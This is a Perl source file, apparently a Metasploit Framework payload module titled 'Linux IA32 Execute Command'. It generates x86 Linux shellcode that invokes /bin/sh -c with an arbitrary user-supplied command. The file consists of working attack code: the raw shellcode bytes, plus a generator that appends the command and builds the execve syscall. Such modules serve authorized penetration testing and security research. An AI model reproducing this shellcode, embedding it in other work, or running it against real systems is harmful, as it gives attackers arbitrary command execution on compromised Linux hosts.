
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Payload::linux_ia32_exec;
use strict;
use base 'Msf::PayloadComponent::NoConnection';
use Pex::x86;

my $info =
{
  'Name'         => 'Linux IA32 Execute Command',
  'Version'      => '$Revision$',
  'Description'  => 'Execute an arbitrary command',
  'Authors'      => [ 'vlad902 <vlad902 [at] gmail.com>', ],
  'Arch'         => [ 'x86' ],
  'Priv'         => 0,
  'OS'           => [ 'linux' ],
  'Size'         => '',
  'UserOpts'     =>
   {
      'CMD' => [1, 'DATA', 'The command string to execute'],
   },
};

sub new {
  my $class = shift;
  my $hash = @_ ? shift : { };
  $hash = $class->MergeHashRec($hash, {'Info' => $info});
  my $self = $class->SUPER::new($hash, @_);

  $self->_Info->{'Size'} = $self->_GenSize;
  return($self);
}

sub Build {
  my $self = shift;
  return($self->Generate($self->GetVar('CMD')));
}

sub Generate {
  my $self = shift;
  my $cmd = shift;

  my $shellcode =
    "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68".
    "\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52".
    Pex::x86::call(length($cmd)+1).
    $cmd . "\x00".
    "\x57\x53\x89\xe1\xcd\x80";

  return($shellcode);
}

sub _GenSize {
  my $self = shift;
  my $bin = $self->Generate('');
  return(length($bin));
}

1;
